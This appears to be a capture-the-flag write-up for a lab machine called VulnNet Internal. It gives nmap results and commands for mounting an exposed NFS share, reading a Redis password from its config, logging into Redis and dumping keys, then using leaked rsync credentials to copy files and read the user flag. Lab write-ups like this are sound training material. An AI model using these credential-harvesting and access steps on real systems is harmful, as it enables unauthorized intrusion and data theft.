![image](https://user-images.githubusercontent.com/68326057/117233034-fd40ff00-ae3f-11eb-8173-04658ae718fd.png)

# NMAP

```bash
PORT      STATE    SERVICE     REASON      VERSION

22/tcp    open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=
|   256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i

111/tcp   open     rpcbind     syn-ack     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      49358/udp6  mountd
|   100005  1,2,3      49863/tcp6  mountd
|   100005  1,2,3      55535/tcp   mountd
|   100005  1,2,3      58330/udp   mountd
|   100021  1,3,4      42699/tcp6  nlockmgr
|   100021  1,3,4      45099/tcp   nlockmgr
|   100021  1,3,4      45323/udp   nlockmgr
|   100021  1,3,4      56994/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn syn-ack     Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp   open     netbios-ssn syn-ack     Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

873/tcp   open     rsync       syn-ack     (protocol version 31)

2049/tcp  open     nfs_acl     syn-ack     3 (RPC #100227)

6379/tcp  open     redis       Redis key-value store 

9090/tcp  filtered zeus-admin  no-response

57797/tcp open     mountd      syn-ack     1-3 (RPC #100005)

Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -6h09m58s, deviation: 1h09m16s, median: -5h29m59s
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46849/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54877/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 5770/udp): CLEAN (Failed to receive data)
|   Check 4 (port 53803/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-05-06T04:27:49+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-06T02:27:49
|_  start_date: N/A
```

# port 111

```bash
showmount -e IP
```

![image](https://user-images.githubusercontent.com/68326057/117233586-08485f00-ae41-11eb-867e-6f3ae4c27f13.png)

```bash
sudo mount -o rw 10.10.236.231:/opt/conf /tmp/mountme
```

![image](https://user-images.githubusercontent.com/68326057/117234112-fc10d180-ae41-11eb-8b02-113f89963274.png)


```bash
In radis.conf

slave-serve-stale-data yes                                                                                                             

Master-Auth
requirepass "B65Hx562F@ggAZ@F"                                                                                                         
                                               
```

# SMB

```bash
smbclient -L \\\\IP
```

![image](https://user-images.githubusercontent.com/68326057/117235323-219eda80-ae44-11eb-8332-d6c524928251.png)

```bash
smbclient \\\\IP\shares
```

![image](https://user-images.githubusercontent.com/68326057/117235388-3ed3a900-ae44-11eb-98c1-000c1b86620b.png)

![image](https://user-images.githubusercontent.com/68326057/117235474-675ba300-ae44-11eb-96d5-8329631a7801.png)


![image](https://user-images.githubusercontent.com/68326057/117235467-6165c200-ae44-11eb-8551-01bb1db0c08c.png)

In service.txt there is a flag.

In data.txt

```bash
Purge regularly data that is not needed anymore
```

In business-req.txt
```bash
We just wanted to remind you that we_re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
```

# REDIS

## Downloads it -->
```bash
sudo apt install redis-tools
```

```bash
redis-cli -h 10.10.236.231 --pass B65Hx562F@ggAZ@F
```

![image](https://user-images.githubusercontent.com/68326057/117236376-2d8b9c00-ae46-11eb-9640-2ed762ae34d4.png)


--> https://book.hacktricks.xyz/pentesting/6379-pentesting-redis


![image](https://user-images.githubusercontent.com/68326057/117236538-7fccbd00-ae46-11eb-9b65-8e9f8c6d2357.png)


![image](https://user-images.githubusercontent.com/68326057/117236693-d9cd8280-ae46-11eb-8147-6d2e2e09ae82.png)

# Trying to dump Database

![image](https://user-images.githubusercontent.com/68326057/117236771-084b5d80-ae47-11eb-8e1d-6ca8a869b1e3.png)

![image](https://user-images.githubusercontent.com/68326057/117236917-61b38c80-ae47-11eb-86c1-2fcf6c2aa795.png)


```bash
 get "internal flag"  -> get flag
```

![image](https://user-images.githubusercontent.com/68326057/117237713-20bc7780-ae49-11eb-9b1c-508a3f450302.png)



![image](https://user-images.githubusercontent.com/68326057/117245898-42bdf600-ae59-11eb-9bb4-7a3dffd6d6bb.png)


![image](https://user-images.githubusercontent.com/68326057/117245923-4fdae500-ae59-11eb-9930-0ca676467692.png)


```bash
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

# rsync

```bash
rsync -av rsync://rsync-connect@10.10.139.81/files/ . to copy all files
```

--> https://book.hacktricks.xyz/pentesting/873-pentesting-rsync


# user.txt

```bash
cd sys-internal
cat user.txt
ls -Ra (to recursively list)

```

![image](https://user-images.githubusercontent.com/68326057/117246522-6cc3e800-ae5a-11eb-887d-5ea486d115f9.png)

